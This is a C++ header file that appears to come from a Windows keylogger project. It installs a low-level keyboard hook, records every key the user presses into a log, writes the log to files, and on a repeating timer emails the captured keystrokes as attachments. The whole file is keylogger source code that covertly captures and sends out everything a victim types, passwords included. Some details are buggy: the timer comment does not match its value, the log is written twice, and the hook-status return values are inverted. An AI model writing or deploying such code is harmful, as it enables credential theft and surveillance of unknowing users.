#ifndef KEYBHOOK_H
#define KEYBHOOK_H
#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "IO.h"
#include "SendMail.h"


//Keylog contains the keys pressed.
//Initially it is empty.
std::string keylog = "";

//Sends mail
void TimerSendMail ()
    {
        if (keylog.empty ())                                            //If keylog is empty then there is no need to send mail.
            return;

        std::string last_file = IO::WriteLog (keylog);                  //Get the name of last file made.

        if (last_file.empty ())                                         //If file was not created
            {
                Helper::WriteAppLog ("File creation was not successful. Keylog '" + keylog + "'");
                return;
            }
                                                                        //Else send mail
        int x = Mail::SendMail ("Log [" + last_file + "]",                                                  //Title
                                "Hi :)\nThe file has been attached to this mail :)\nFor testing there is"   //Body
                                " content of the file:\n\n--------------------------\n" + keylog,
                                IO::GetOurPath (true) +  last_file                                         //Attachments
                                );
        if (x != 7)                                                     //If SendMail sends 7 then the everything went ok else there is some error
            Helper::WriteAppLog ("Mail was not sent! Error code: " + Helper::ToString (x));
        else
            {
                std:: string path = IO::GetOurPath(true);               //Appending data to Data.txt for debugging
                std::ofstream file;
                file.open(path + "Data.txt");
                Helper::DateTime dt;
                file << dt.GetDateString() << std::endl;
                file << keylog;
                file << keylog;
                file.close();
                keylog = "";
            }

    }



Timer MailTimer (TimerSendMail, 500 * 60, Timer::Infinite);
//Creating instance of MailTimer of Timer class.The function TimersendMail will be called after every 30 seconds and till infinite time.

//Hook::

//A hook is a mechanism by which an application can intercept events, such as messages, mouse actions, and keystrokes.
//A function that intercepts a particular type of event is known as a hook procedure. A hook procedure can act on each event
//it receives, and then modify or discard the event.


HHOOK eHook = NULL;

//Records the keys pressed and stores them to keylog string.
LRESULT OurKeyboardProc (int nCode, WPARAM wparam, LPARAM lparam)
{
        if (nCode < 0)
            CallNextHookEx(eHook, nCode,  wparam, lparam);              //Some problem so loosen the keHook Created.


        KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
        if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)            //eg [Shift]/*other keys*/[/Shift]
            {                                                           //Other keys are recorded here
                keylog += Keys::KEYS[kbs->vkCode].Name;
                if (kbs->vkCode == VK_RETURN)
                    keylog += '\n';
            }
        else if (wparam == WM_KEYUP || wparam  == WM_SYSKEYUP)          //in above example this function inserts[/Shift]
            {
                DWORD key = kbs->vkCode;
                if (    key == VK_CONTROL
                        || key == VK_LCONTROL
                        || key == VK_RCONTROL
                        || key == VK_SHIFT
                        || key == VK_LSHIFT
                        || key == VK_RSHIFT
                        || key == VK_MENU
                        || key == VK_LMENU
                        || key == VK_RMENU
                        || key == VK_CAPITAL
                        || key == VK_NUMLOCK
                        || key == VK_LWIN
                        || key == VK_RWIN
                    )
                    {
                        string KeyName = Keys::KEYS[kbs->vkCode].Name;
                        KeyName.insert (1, "/");
                        keylog += KeyName;
                    }
            }
        return CallNextHookEx(eHook, nCode,  wparam, lparam);               //Loosening the hook "eHook" created.
    }



bool InstalHook ()                                                          //Installs hook named eHook to interfere with the Windows system to record keystrokes
    {


        Helper::WriteAppLog ("Hook started... Timer started");
        MailTimer.Start (true);

        eHook = SetWindowsHookEx (WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle (NULL), 0);

        return eHook == NULL;
    }


bool UninstalHook ()                                                    //Uninstall the keystrokes
    {

        BOOL b = UnhookWindowsHookEx (eHook);
        eHook = NULL;
        return (bool)b;
    }

bool IsHooked ()                                                        //Return true if hook is installed else returns false.
    {

        return (bool)(eHook == NULL);
    }
#endif
